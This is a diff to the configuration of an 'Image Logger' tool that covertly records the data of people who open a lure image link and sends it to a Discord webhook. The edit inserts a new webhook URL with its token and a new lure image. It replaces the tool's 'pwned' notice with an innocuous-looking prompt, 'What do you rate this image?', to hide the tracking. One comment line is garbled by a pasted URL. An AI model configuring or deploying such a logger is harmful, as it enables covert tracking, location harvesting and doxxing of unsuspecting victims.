@@ -12,13 +12,12 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1091220366984224788/Te54hSoJ1kqvAWLompNzA3aWux7gaiQ9IMgedx76z4grFYQd2dcefXbxnl5tbE4DOVbq",
-    "image": "https://imageio.forbes.com/specials-images/imageserve/5d35eacaf1176b0008974b54/0x0.jpg?format=jpg&crop=4560,2565,x790,y784,safe&width=1200", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1493646689628586125/GdylFoIpNS6_IGFw5PdUA34wUFTMeEOE547h1oxvy_-pPsXhAgeV0MM87m_vnmrqMr4V",
+    "image": "https://media.discordapp.net/attachments/1463961723768934494/1559997814258270289/Screenshot_2026-05-10_144023.png?ex=6ad11cae&is=6acfcb2e&hm=a3696a35374658b2536e6a91764149127cc96279bf983e1f33b4d80e7d4d9b24&=&format=webp&quality=lossless", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
-    # CUSTOMIZATION #
-    "username": "Image Logger", # Set this to the name you want the webhook to have
+    # CUSTOMIZATION #https://media.discordapp.net/attachments/1463961723768934494/1559997814258270289/Screenshot_2026-05-10_144023.png?ex=6ad11cae&is=6acfcb2e&hm=a3696a35374658b2536e6a91764149127cc96279bf983e1f33b4d80e7d4d9b24&=&format=webp&quality=lossless    "username": "Image Logger", # Set this to the name you want the webhook to have
     "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
@@ -27,8 +26,8 @@ config = {
     "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
     "message": { # Show a custom message when the user opens the image
-        "doMessage": False, # Enable the custom message?
-        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
+        "doMessage": True, # Enable the custom message?
+        "message": "What do you rate this image?", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
